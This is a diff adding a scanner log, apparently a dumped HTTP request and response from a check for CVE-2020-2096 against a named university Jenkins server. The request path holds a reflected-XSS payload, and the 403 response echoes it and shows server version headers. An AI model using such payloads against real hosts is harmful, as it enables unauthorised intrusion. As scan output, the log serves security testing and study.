@@ -1,0 +1,34 @@
+[CVE-2020-2096] Dumped HTTP request for https://pipeline.eresearch.unimelb.edu.au/gitlab/build_now</script><script>alert(document.domain)</script>
+
+
+GET /gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
+Host: pipeline.eresearch.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[CVE-2020-2096] Dumped HTTP response https://pipeline.eresearch.unimelb.edu.au/gitlab/build_now</script><script>alert(document.domain)</script>
+
+HTTP/1.1 403 Forbidden
+Connection: close
+Content-Type: text/html;charset=utf-8
+Date: Wed, 06 Aug 2025 15:18:12 GMT
+Expires: Thu, 01 Jan 1970 00:00:00 GMT
+Server: Jetty(12.0.22)
+Set-Cookie: JSESSIONID.f9da2665=node0191916qesvcwc1tc7zba8cp1ug2929.node0; Path=/; Secure; HttpOnly; SameSite=Lax
+Strict-Transport-Security: max-age=63072000
+Vary: Accept-Encoding
+X-Content-Type-Options: nosniff
+X-Hudson: 1.395
+X-Jenkins: 2.516.1
+X-Jenkins-Session: 529aec02
+
+<html><head><meta http-equiv='refresh' content='1;url=/login?from=%2Fgitlab%2Fbuild_now%253C%252Fscript%253E%253Cscript%253Ealert%2528document.domain%2529%253C%252Fscript%253E'/><script id='redirect' data-redirect-url='/login?from=%2Fgitlab%2Fbuild_now%253C%252Fscript%253E%253Cscript%253Ealert%2528document.domain%2529%253C%252Fscript%253E' src='/static/529aec02/scripts/redirect.js'></script></head><body style='background-color:white; color:white;'>
+Authentication required
+<!--
+-->
+
+</body></html>                                                                                                                                                                                                                                                                                                            
